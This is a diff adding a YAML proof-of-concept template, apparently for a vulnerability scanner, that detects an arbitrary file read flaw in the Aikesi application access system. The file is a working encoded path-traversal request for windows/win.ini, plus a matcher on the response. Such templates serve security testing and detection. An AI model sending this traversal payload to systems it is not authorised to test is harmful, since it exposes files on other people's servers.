@@ -1,0 +1,13 @@
+id: poc-yaml-aikesi-system-arbitrary-file-read
+info:
+  name: 艾科思-应用接入系统-任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 艾科思应用接入系统
+requests:
+- method: GET
+  path: /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini
+  expression: status_code == 200 && contains(body, "[fonts]") && contains(body, "[extensions]")
+variables: {}
+transport: http
